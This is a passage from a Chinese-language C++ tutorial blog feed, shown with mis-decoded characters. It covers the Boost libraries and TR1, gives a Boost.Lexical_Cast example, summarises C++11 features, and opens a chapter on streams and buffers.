href="#18-8-1-Boost-é¡¹ç›®" class="headerlink" title="18.8.1 Boost é¡¹ç›®"></a>18.8.1 Boost é¡¹ç›®</h3><p><strong>Boost C++ åº“ (Boost C++ Libraries)</strong> æ˜¯ä¸€ä¸ªå¹¿å—æ¨å´‡çš„ã€é«˜è´¨é‡çš„ã€ç»è¿‡åŒè¡Œè¯„å®¡çš„ C++ åº“é›†åˆã€‚å®ƒç”± C++ ç¤¾åŒºçš„ä¼—å¤šå¼€å‘è€…å…±åŒç»´æŠ¤å’Œè´¡çŒ®ã€‚</p><ul><li>  <strong>ç›®çš„:</strong> Boost æ—¨åœ¨æä¾›å„ç§é€šç”¨å’Œç‰¹å®šé¢†åŸŸçš„åº“ï¼Œæ‰©å±• C++ æ ‡å‡†åº“çš„åŠŸèƒ½ã€‚å®ƒæ—¢åŒ…å«å¯ä»¥ç›´æ¥ä½¿ç”¨çš„å·¥å…·ï¼ˆå¦‚æ—¥æœŸæ—¶é—´å¤„ç†ã€æ–‡ä»¶ç³»ç»Ÿæ“ä½œã€æ­£åˆ™è¡¨è¾¾å¼ã€æµ‹è¯•æ¡†æ¶ç­‰ï¼‰ï¼Œä¹ŸåŒ…å«ä¸€äº›å®éªŒæ€§çš„ã€å¯èƒ½åœ¨æœªæ¥è¢«çº³å…¥ C++ æ ‡å‡†çš„åº“ã€‚</li><li>  <strong>å½±å“åŠ›:</strong> Boost å¯¹ C++ æ ‡å‡†çš„å‘å±•äº§ç”Ÿäº†æ·±è¿œå½±å“ã€‚è®¸å¤š C++11 åŠåç»­æ ‡å‡†ä¸­çš„æ–°ç‰¹æ€§ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ <code>shared_ptr</code>ã€å‡½æ•°åŒ…è£…å™¨ <code>function</code>ã€çº¿ç¨‹åº“ã€æ­£åˆ™è¡¨è¾¾å¼åº“ã€å…ƒç»„ <code>tuple</code>ã€<code>array</code> ç­‰ï¼‰éƒ½èµ·æºäº Boost åº“ä¸­çš„å¯¹åº”ç»„ä»¶ï¼Œå¹¶åœ¨ Boost ä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨å’ŒéªŒè¯ã€‚</li><li>  <strong>â€œè¯•ç‚¼åœºâ€:</strong> Boost å¸¸å¸¸è¢«è§†ä¸º C++ æ–°ç‰¹æ€§çš„â€œè¯•ç‚¼åœºâ€ã€‚ä¸€ä¸ªåº“å¦‚æœåœ¨ Boost ä¸­è¢«è¯æ˜æ˜¯ç¨³å®šã€æœ‰ç”¨ä¸”è®¾è®¡è‰¯å¥½çš„ï¼Œé‚£ä¹ˆå®ƒè¢« C++ æ ‡å‡†å§”å‘˜ä¼šè€ƒè™‘å¹¶æœ€ç»ˆçº³å…¥å®˜æ–¹æ ‡å‡†çš„å¯èƒ½æ€§å°±ä¼šå¤§å¤§å¢åŠ ã€‚</li><li>  <strong>è®¸å¯è¯:</strong> Boost åº“é€šå¸¸é‡‡ç”¨éå¸¸å®½æ¾çš„ Boost Software Licenseï¼Œå…è®¸åœ¨å•†ä¸šå’Œéå•†ä¸šé¡¹ç›®ä¸­è‡ªç”±ä½¿ç”¨ã€‚</li></ul><p>å³ä½¿æŸäº›åŠŸèƒ½å·²è¢«çº³å…¥ C++ æ ‡å‡†åº“ï¼ŒBoost ä»ç„¶æä¾›äº†æ ‡å‡†åº“ä¸­å°šæœªåŒ…å«çš„è®¸å¤šæœ‰ç”¨å·¥å…·ï¼Œå¹¶ä¸”æœ‰æ—¶ä¼šæä¾›æ¯”æ ‡å‡†åº“ç‰ˆæœ¬æ›´æ—©æˆ–åŠŸèƒ½æ›´ä¸°å¯Œçš„å®ç°ã€‚</p><h3 id="18-8-2-TR1-Technical-Report-1"><a href="#18-8-2-TR1-Technical-Report-1" class="headerlink" title="18.8.2 TR1 (Technical Report 1)"></a>18.8.2 TR1 (Technical Report 1)</h3><p>**TR1 (Technical Report 1)**ï¼Œæ­£å¼åç§°æ˜¯ ISO/IEC TR 19768:2007ï¼Œæ˜¯ C++ æ ‡å‡†å§”å‘˜ä¼šå‘å¸ƒçš„ä¸€ä»½æŠ€æœ¯æŠ¥å‘Šï¼Œæ—¨åœ¨æ‰©å±• C++03 æ ‡å‡†åº“ã€‚å®ƒå¹¶ä¸æ˜¯ C++ æ ‡å‡†æœ¬èº«çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒå®šä¹‰äº†ä¸€ç³»åˆ—æ¨èæ·»åŠ çš„åº“ç»„ä»¶ã€‚</p><ul><li><strong>å†…å®¹:</strong> TR1 åŒ…å«äº†è®¸å¤šåæ¥è¢«æ­£å¼çº³å…¥ C++11 æ ‡å‡†åº“çš„ç‰¹æ€§ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æºè‡ª Boost åº“ã€‚ä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š<ul><li>  å¼•ç”¨åŒ…è£…å™¨ (<code>ref</code>, <code>cref</code>)</li><li>  æ™ºèƒ½æŒ‡é’ˆ (<code>shared_ptr</code>, <code>weak_ptr</code> - <code>unique_ptr</code> æ˜¯ C++11 æ–°è®¾è®¡çš„)</li><li>  å‡½æ•°å¯¹è±¡åŒ…è£…å™¨ (<code>function</code>)</li><li>  å‡½æ•°å¯¹è±¡ç»‘å®šå™¨ (<code>bind</code>)</li><li>  ç±»å‹èƒå– (<code>&lt;type_traits&gt;</code>)</li><li>  éšæœºæ•°ç”Ÿæˆ (<code>&lt;random&gt;</code>)</li><li>  å…ƒç»„ (<code>&lt;tuple&gt;</code>)</li><li>  å›ºå®šå¤§å°æ•°ç»„ (<code>&lt;array&gt;</code>)</li><li>  å“ˆå¸Œè¡¨å®¹å™¨ (<code>&lt;unordered_set&gt;</code>, <code>&lt;unordered_map&gt;</code>)</li><li>  æ­£åˆ™è¡¨è¾¾å¼ (<code>&lt;regex&gt;</code>)</li></ul></li><li>  <strong>å‘½åç©ºé—´:</strong> TR1 ä¸­çš„ç»„ä»¶é€šå¸¸è¢«æ”¾ç½®åœ¨ <code>std::tr1</code> å‘½åç©ºé—´ä¸‹ã€‚ä¾‹å¦‚ï¼ŒTR1 çš„æ™ºèƒ½æŒ‡é’ˆæ˜¯ <code>std::tr1::shared_ptr</code>ã€‚</li><li>  <strong>è¿‡æ¸¡è§’è‰²:</strong> TR1 èµ·åˆ°äº†ä¸€ä¸ªé‡è¦çš„è¿‡æ¸¡ä½œç”¨ã€‚å®ƒå…è®¸ç¼–è¯‘å™¨å‚å•†å’Œåº“å¼€å‘è€…åœ¨ C++11 æ ‡å‡†æ­£å¼å‘å¸ƒä¹‹å‰ï¼Œå°±å¼€å§‹å®ç°å’Œæä¾›è¿™äº›å³å°†æ ‡å‡†åŒ–çš„é‡è¦åº“åŠŸèƒ½ï¼Œè®©ç”¨æˆ·å¯ä»¥æå‰ä½“éªŒå’Œä½¿ç”¨ã€‚å½“ C++11 æ ‡å‡†å‘å¸ƒåï¼Œè¿™äº›ç»„ä»¶è¢«æ­£å¼ç§»å…¥äº† <code>std</code> å‘½åç©ºé—´ï¼Œ<code>std::tr1</code> å‘½åç©ºé—´åˆ™é€æ¸è¢«åºŸå¼ƒã€‚</li></ul><p>äº†è§£ Boost å’Œ TR1 æœ‰åŠ©äºç†è§£ C++11 ä¸­è®¸å¤šåº“ç‰¹æ€§çš„æ¥æºå’Œæ¼”å˜è¿‡ç¨‹ã€‚å®ƒä»¬å±•ç¤ºäº† C++ ç¤¾åŒºé©±åŠ¨è¯­è¨€å‘å±•çš„æ¨¡å¼ï¼šé€šè¿‡ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Boostï¼‰è¿›è¡Œæ¢ç´¢å’Œå®è·µï¼Œé€šè¿‡æŠ€æœ¯æŠ¥å‘Šï¼ˆå¦‚ TR1ï¼‰è¿›è¡Œé¢„æ ‡å‡†åŒ–ï¼Œæœ€ç»ˆå°†æˆç†Ÿçš„ç‰¹æ€§çº³å…¥å®˜æ–¹æ ‡å‡†ã€‚</p><h3 id="18-8-3-ä½¿ç”¨-Boost"><a href="#18-8-3-ä½¿ç”¨-Boost" class="headerlink" title="18.8.3 ä½¿ç”¨ Boost"></a>18.8.3 ä½¿ç”¨ Boost</h3><p>è™½ç„¶è®¸å¤š Boost åº“çš„åŠŸèƒ½å·²è¢« C++11 åŠåç»­æ ‡å‡†å¸æ”¶ï¼Œä½† Boost ä»ç„¶æ˜¯ä¸€ä¸ªéå¸¸æœ‰ä»·å€¼çš„èµ„æºåº“ã€‚</p><p><strong>å¦‚ä½•ä½¿ç”¨ Boost (æ¦‚å¿µæ€§æ­¥éª¤):</strong></p><ol><li> <strong>ä¸‹è½½:</strong> ä» Boost å®˜æ–¹ç½‘ç«™ (<a href="https://www.boost.org/">boost.org</a>) ä¸‹è½½æœ€æ–°çš„ Boost å‘è¡Œç‰ˆã€‚</li><li> <strong>è§£å‹:</strong> å°†ä¸‹è½½çš„å‹ç¼©åŒ…è§£å‹åˆ°ä½ é€‰æ‹©çš„ç›®å½•ã€‚</li><li><strong>ç¼–è¯‘ (éƒ¨åˆ†åº“éœ€è¦):</strong> Boost ä¸­çš„è®¸å¤šåº“æ˜¯<strong>ä»…å¤´æ–‡ä»¶ (Header-only)</strong> çš„ï¼Œè¿™æ„å‘³ç€ä½ åªéœ€è¦åœ¨ä½ çš„ä»£ç ä¸­ <code>#include</code> ç›¸åº”çš„å¤´æ–‡ä»¶ï¼Œå¹¶å°† Boost çš„æ ¹ç›®å½•æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„åŒ…å«è·¯å¾„ (Include Path) ä¸­å³å¯ä½¿ç”¨ã€‚ç„¶è€Œï¼Œä¹Ÿæœ‰ä¸€äº›åº“ï¼ˆå¦‚ Boost.Thread, Boost.Filesystem, Boost.Regex, Boost.Program_options ç­‰ï¼‰éœ€è¦<strong>ç¼–è¯‘</strong>æˆé™æ€åº“æˆ–åŠ¨æ€åº“æ–‡ä»¶ã€‚<ul><li>  ç¼–è¯‘é€šå¸¸éœ€è¦è¿è¡Œ Boost æä¾›çš„ <code>bootstrap</code> è„šæœ¬ï¼ˆæ ¹æ®ä½ çš„æ“ä½œç³»ç»Ÿé€‰æ‹© <code>.bat</code> æˆ– <code>.sh</code>ï¼‰ï¼Œç„¶åè¿è¡Œç”Ÿæˆçš„ <code>b2</code> (æˆ– <code>bjam</code>) æ„å»ºå·¥å…·ã€‚ä½ éœ€è¦æŒ‡å®šä½ çš„ç¼–è¯‘å™¨ã€æ„å»ºç±»å‹ï¼ˆdebug/releaseï¼‰ã€é“¾æ¥æ–¹å¼ï¼ˆstatic/sharedï¼‰ç­‰ã€‚å…·ä½“æ­¥éª¤è¯·å‚è€ƒ Boost å®˜æ–¹æ–‡æ¡£ã€‚</li></ul></li><li><strong>é…ç½®é¡¹ç›®:</strong><ul><li>  <strong>åŒ…å«è·¯å¾„:</strong> åœ¨ä½ çš„é¡¹ç›®è®¾ç½®ä¸­ï¼Œå°† Boost åº“çš„æ ¹ç›®å½•æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„ã€‚</li><li>  <strong>åº“è·¯å¾„ (å¦‚æœç¼–è¯‘äº†åº“):</strong> å°†ç”Ÿæˆçš„åº“æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ·»åŠ åˆ°é“¾æ¥å™¨çš„åº“æ–‡ä»¶æœç´¢è·¯å¾„ã€‚</li><li>  <strong>é“¾æ¥åº“ (å¦‚æœç¼–è¯‘äº†åº“):</strong> å°†ä½ éœ€è¦ä½¿ç”¨çš„ Boost åº“æ–‡ä»¶ï¼ˆå¦‚ <code>libboost_thread-vc142-mt-gd-x64-1_79.lib</code> ç­‰ï¼Œæ–‡ä»¶åä¼šæ ¹æ®ç‰ˆæœ¬ã€ç¼–è¯‘å™¨ã€é…ç½®ç­‰å˜åŒ–ï¼‰æ·»åŠ åˆ°é“¾æ¥å™¨çš„è¾“å…¥ä¸­ã€‚</li></ul></li><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> åœ¨ä½ çš„ C++ ä»£ç ä¸­ä½¿ç”¨ <code>#include &lt;boost/xxx.hpp&gt;</code> æ¥åŒ…å«æ‰€éœ€çš„ Boost å¤´æ–‡ä»¶ã€‚</li></ol><p><strong>ç¤ºä¾‹ (ä½¿ç”¨ Boost.Lexical_Cast):</strong><br>Boost.Lexical_Cast æ˜¯ä¸€ä¸ªä»…å¤´æ–‡ä»¶çš„åº“ï¼Œç”¨äºå­—ç¬¦ä¸²å’Œæ•°å€¼ä¹‹é—´çš„è½¬æ¢ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾ Boost æ ¹ç›®å½•å·²æ·»åŠ åˆ°åŒ…å«è·¯å¾„</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;boost/lexical_cast.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> s = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> i = boost::lexical_cast&lt;<span class="keyword">int</span>&gt;(s);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27; cast to int: &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> d = <span class="number">3.14159</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> sd = boost::lexical_cast&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(d);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Double &quot;</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; cast to string: &#x27;&quot;</span> &lt;&lt; sd &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> bad_s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> bad_i = boost::lexical_cast&lt;<span class="keyword">int</span>&gt;(bad_s); <span class="comment">// ä¼šæŠ›å‡º boost::bad_lexical_cast å¼‚å¸¸</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> boost::bad_lexical_cast&amp; e) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Lexical cast error: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Boost åº“å¯ä»¥æå¤§åœ°æ‰©å±• C++ çš„èƒ½åŠ›ï¼Œä½†éœ€è¦æ³¨æ„æ­£ç¡®é…ç½®ç¼–è¯‘å’Œé“¾æ¥ç¯å¢ƒã€‚å»ºè®®è¯¦ç»†é˜…è¯»ä½ æ‰€ä½¿ç”¨çš„å…·ä½“ Boost åº“çš„æ–‡æ¡£ã€‚</p><h2 id="18-9-æ€»ç»“"><a href="#18-9-æ€»ç»“" class="headerlink" title="18.9 æ€»ç»“"></a>18.9 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº† C++11 æ ‡å‡†å¼•å…¥çš„ä¸€ç³»åˆ—é‡è¦ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§æå¤§åœ°æ”¹å˜äº† C++ çš„ç¼–ç¨‹æ–¹å¼ï¼Œä½¿å…¶æ›´é«˜æ•ˆã€æ›´å®‰å…¨ã€æ›´æ˜“ç”¨ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p> <strong>C++11 ç‰¹æ€§å›é¡¾:</strong> å¤ä¹ äº†ä¹‹å‰ç« èŠ‚å·²ä»‹ç»çš„ C++11 åŠŸèƒ½ï¼ŒåŒ…æ‹¬æ–°ç±»å‹ (<code>long long</code>, <code>char16_t</code>, <code>char32_t</code>, <code>nullptr</code>)ã€ç»Ÿä¸€åˆå§‹åŒ– (<code>&#123;&#125;</code>), å£°æ˜ (<code>auto</code>, <code>decltype</code>)ã€æ™ºèƒ½æŒ‡é’ˆ (<code>unique_ptr</code>, <code>shared_ptr</code>, <code>weak_ptr</code>)ã€å¼‚å¸¸è§„èŒƒ (<code>noexcept</code>)ã€ä½œç”¨åŸŸå†…æšä¸¾ (<code>enum class</code>) ä»¥åŠå¯¹ç±»ã€æ¨¡æ¿å’Œ STL çš„æ”¹è¿›ï¼ˆå¦‚èŒƒå›´ <code>for</code>ã€<code>array</code>ã€æ— åºå®¹å™¨ã€<code>initializer_list</code>ã€æ¨¡æ¿åˆ«å <code>using</code>ï¼‰ã€‚</p></li><li><p><strong>ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨:</strong></p><ul><li>  <strong>å³å€¼å¼•ç”¨ (<code>&amp;&amp;</code>):</strong> å¼•å…¥ç”¨äºåŒºåˆ†å³å°†é”€æ¯çš„ä¸´æ—¶å¯¹è±¡ï¼ˆå³å€¼ï¼‰å’ŒæŒä¹…å¯¹è±¡ï¼ˆå·¦å€¼ï¼‰ã€‚</li><li>  <strong>ç§»åŠ¨è¯­ä¹‰:</strong> å…è®¸ä»å³å€¼æˆ–æ ‡è®°ä¸ºå¯ç§»åŠ¨çš„å¯¹è±¡é‚£é‡Œâ€œçªƒå–â€èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜æŒ‡é’ˆï¼‰ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ˜‚è´µçš„å¤åˆ¶ã€‚</li><li>  <strong>ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦:</strong> ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œæ¥æ”¶å³å€¼å¼•ç”¨å‚æ•°ï¼Œå®ç°èµ„æºè½¬ç§»å¹¶å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆçš„ç©ºçŠ¶æ€ã€‚åº”æ ‡è®°ä¸º <code>noexcept</code>ã€‚</li><li>  <strong><code>std::move</code>:</strong> å°†ä¸€ä¸ªå·¦å€¼å¼ºåˆ¶è½¬æ¢ä¸ºå³å€¼å¼•ç”¨ç±»å‹ï¼Œä»¥è§¦å‘ç§»åŠ¨è¯­ä¹‰ï¼ˆä½†æœ¬èº«ä¸æ‰§è¡Œç§»åŠ¨ï¼‰ã€‚ä½¿ç”¨åä¸åº”å¯¹æºå¯¹è±¡çš„å€¼åšå‡è®¾ã€‚</li></ul></li><li><p><strong>æ–°çš„ç±»åŠŸèƒ½:</strong></p><ul><li>  <strong>ç‰¹æ®Šæˆå‘˜å‡½æ•°æ§åˆ¶ (<code>= default</code>, <code>= delete</code>):</strong> æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤å®ç°æˆ–ç¦ç”¨ç‰¹å®šæˆå‘˜å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼‰ã€‚</li><li>  <strong>å§”æ‰˜æ„é€ å‡½æ•°:</strong> å…è®¸ä¸€ä¸ªæ„é€ å‡½æ•°è°ƒç”¨åŒä¸€ç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå‡å°‘ä»£ç é‡å¤ã€‚</li><li>  <strong>ç»§æ‰¿æ„é€ å‡½æ•° (<code>using Base::Base;</code>):</strong> å…è®¸æ´¾ç”Ÿç±»ç»§æ‰¿åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œç®€åŒ–æ´¾ç”Ÿç±»ç¼–å†™ã€‚</li><li>  <strong>è™šå‡½æ•°ç®¡ç† (<code>override</code>, <code>final</code>):</strong> <code>override</code> ç¡®ä¿æ´¾ç”Ÿç±»æ–¹æ³•æ­£ç¡®è¦†ç›–åŸºç±»è™šå‡½æ•°ï¼›<code>final</code> é˜»æ­¢è™šå‡½æ•°è¢«è¿›ä¸€æ­¥è¦†ç›–æˆ–ç±»è¢«ç»§æ‰¿ã€‚</li></ul></li><li><p><strong>Lambda å‡½æ•°:</strong></p><ul><li>  æä¾›ç®€æ´çš„è¯­æ³•ï¼Œç”¨äºåœ¨éœ€è¦å¯è°ƒç”¨å¯¹è±¡çš„åœ°æ–¹<strong>å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡</strong>ã€‚</li><li>  <strong><code>[capture](params) -&gt; ret &#123;body&#125;</code>:</strong> åŒ…å«æ•è·å­å¥ã€å‚æ•°åˆ—è¡¨ï¼ˆå¯é€‰ï¼‰ã€è¿”å›ç±»å‹ï¼ˆå¯é€‰ï¼‰å’Œå‡½æ•°ä½“ã€‚</li><li>  <strong>æ•è·:</strong> å¯ä»¥é€šè¿‡å€¼ (<code>=</code>, <code>var</code>) æˆ–å¼•ç”¨ (<code>&amp;</code>, <code>&amp;var</code>) æ•è·å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡ã€‚<code>mutable</code> å…³é”®å­—å…è®¸ä¿®æ”¹å€¼æ•è·å˜é‡çš„å‰¯æœ¬ã€‚</li><li>  å¸¸ç”¨äº STL ç®—æ³•ï¼Œæé«˜ä»£ç çš„å±€éƒ¨æ€§å’Œå¯è¯»æ€§ã€‚</li></ul></li><li><p><strong>åŒ…è£…å™¨ (<code>std::function</code>):</strong></p><ul><li>  å®šä¹‰åœ¨ <code>&lt;functional&gt;</code> ä¸­çš„é€šç”¨å‡½æ•°åŒ…è£…å™¨ã€‚</li><li>  å¯ä»¥å­˜å‚¨ã€å¤åˆ¶å’Œè°ƒç”¨ä»»ä½•å…·æœ‰å…¼å®¹ç­¾åçš„å¯è°ƒç”¨å®ä½“ï¼ˆå‡½æ•°æŒ‡é’ˆã€Lambdaã€å‡½æ•°å¯¹è±¡ã€æˆå‘˜å‡½æ•°ç­‰ï¼‰ã€‚</li><li>  é€šè¿‡ç±»å‹æ“¦é™¤å®ç°ï¼Œæä¾›äº†çµæ´»æ€§ï¼Œä½†åœ¨æ€§èƒ½æ•æ„Ÿåœºæ™¯ä¸‹å¯èƒ½æœ‰å¼€é”€ï¼ˆå †åˆ†é…ã€é—´æ¥è°ƒç”¨ï¼‰ã€‚</li><li>  æ›¿ä»£æ–¹æ¡ˆåŒ…æ‹¬æ¨¡æ¿ï¼ˆç¼–è¯‘æ—¶å·²çŸ¥ç±»å‹æ—¶æ›´é«˜æ•ˆï¼‰ã€å‡½æ•°æŒ‡é’ˆã€ç›´æ¥ä¼ é€’ Lambdaã€‚</li></ul></li><li><p><strong>å¯å˜å‚æ•°æ¨¡æ¿:</strong></p><ul><li>  å…è®¸å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿æ¥å—<strong>ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹</strong>çš„æ¨¡æ¿å‚æ•°ï¼ˆæ¨¡æ¿å‚æ•°åŒ… <code>typename... Args</code>ï¼‰å’Œå‡½æ•°å‚æ•°ï¼ˆå‡½æ•°å‚æ•°åŒ… <code>Args... args</code>ï¼‰ã€‚</li><li>  ä½¿ç”¨ <code>sizeof...(Args)</code> è·å–å‚æ•°æ•°é‡ã€‚</li><li>  é€šå¸¸éœ€è¦é€šè¿‡<strong>é€’å½’</strong>æˆ– C++17 çš„æŠ˜å è¡¨è¾¾å¼æ¥<strong>å±•å¼€</strong>å‚æ•°åŒ…ï¼Œä»¥å¤„ç†æ¯ä¸ªå‚æ•°ã€‚</li></ul></li><li><p><strong>C++11 æ–°å¢çš„å…¶ä»–åŠŸèƒ½:</strong></p><ul><li>  <strong>å¹¶å‘ç¼–ç¨‹:</strong> æ ‡å‡†åº“æ”¯æŒ (<code>&lt;thread&gt;</code>, <code>&lt;mutex&gt;</code>, <code>&lt;atomic&gt;</code>, <code>&lt;future&gt;</code> ç­‰ï¼‰ã€‚</li><li>  <strong>æ–°åº“:</strong> <code>&lt;chrono&gt;</code> (æ—¶é—´), <code>&lt;random&gt;</code> (éšæœºæ•°), <code>&lt;regex&gt;</code> (æ­£åˆ™è¡¨è¾¾å¼), <code>&lt;tuple&gt;</code> (å…ƒç»„)ã€‚</li><li>  <strong>ä½çº§ç¼–ç¨‹:</strong> å¯¹é½æ§åˆ¶ (<code>alignas</code>, <code>alignof</code>), ç¼–è¯‘æ—¶è®¡ç®— (<code>constexpr</code>)ã€‚</li><li>  <strong>æ‚é¡¹:</strong> ç”¨æˆ·å®šä¹‰å­—é¢é‡, åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡ (<code>R&quot;(...)&quot;</code>)ã€‚</li></ul></li><li><p><strong>è¯­è¨€å˜åŒ–:</strong></p><ul><li>  å¼ºè°ƒäº† C++ è¯­è¨€çš„æŒç»­æ¼”è¿›ã€‚</li><li>  ä»‹ç»äº† <strong>Boost åº“</strong>ä½œä¸º C++ æ–°ç‰¹æ€§çš„è¯•éªŒåœºå’Œé‡è¦è¡¥å……ã€‚</li><li>  ä»‹ç»äº† <strong>TR1</strong> ä½œä¸º C++11 åº“ç‰¹æ€§çš„å‰èº«å’Œè¿‡æ¸¡ã€‚</li></ul></li></ol><p>C++11 æ˜¯ C++ å‘å±•çš„ä¸€ä¸ªé‡è¦åˆ†æ°´å²­ï¼Œå®ƒå¼•å…¥çš„è¿™äº›ç‰¹æ€§æ·±åˆ»åœ°å½±å“äº†ç°ä»£ C++ çš„ç¼–ç¨‹é£æ ¼å’Œå®è·µã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 17 è¾“å…¥ã€è¾“å‡ºå’Œæ–‡ä»¶</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_17/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_17/</url>
      
        <content type="html"><![CDATA[<h2 id="17-1-C-è¾“å…¥å’Œè¾“å‡ºæ¦‚è¿°"><a href="#17-1-C-è¾“å…¥å’Œè¾“å‡ºæ¦‚è¿°" class="headerlink" title="17.1 C++è¾“å…¥å’Œè¾“å‡ºæ¦‚è¿°"></a>17.1 C++è¾“å…¥å’Œè¾“å‡ºæ¦‚è¿°</h2><p>C++ ç¨‹åºç»å¸¸éœ€è¦ä¸å¤–éƒ¨ä¸–ç•Œè¿›è¡Œäº¤äº’ï¼šä»é”®ç›˜è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œå°†ç»“æœæ˜¾ç¤ºåˆ°å±å¹•ï¼Œæˆ–è€…è¯»å†™æ–‡ä»¶ã€‚C++ ä½¿ç”¨<strong>æµ (Stream)</strong> çš„æ¦‚å¿µæ¥å¤„ç†è¾“å…¥å’Œè¾“å‡º (I/O) æ“ä½œã€‚</p><h3 id="17-1-1-æµå’Œç¼“å†²åŒº"><a href="#17-1-1-æµå’Œç¼“å†²åŒº" class="headerlink" title="17.1.1 æµå’Œç¼“å†²åŒº"></a>17.1.1 æµå’Œç¼“å†²åŒº</h3><p><strong>æµ (Stream)</strong> æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¿™äº›å­—èŠ‚å¯ä»¥ä»æŸä¸ªæºï¼ˆå¦‚é”®ç›˜ã€æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ï¼‰æµå‘ç¨‹åºï¼ˆè¾“å…¥æµï¼‰ï¼Œæˆ–è€…ä»ç¨‹åºæµå‘æŸä¸ªç›®çš„åœ°ï¼ˆå¦‚å±å¹•ã€æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ï¼‰ï¼ˆè¾“å‡ºæµï¼‰ã€‚å°† I/O æ“ä½œè§†ä¸ºå­—èŠ‚æµå¯ä»¥æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥å¤„ç†å„ç§ä¸åŒçš„ I/O è®¾å¤‡ã€‚</p><p><strong>ç¼“å†²åŒº (Buffer)</strong> æ˜¯ä¸€å—å†…å­˜åŒºåŸŸï¼Œç”¨äºä¸´æ—¶å­˜å‚¨æ•°æ®ã€‚I/O 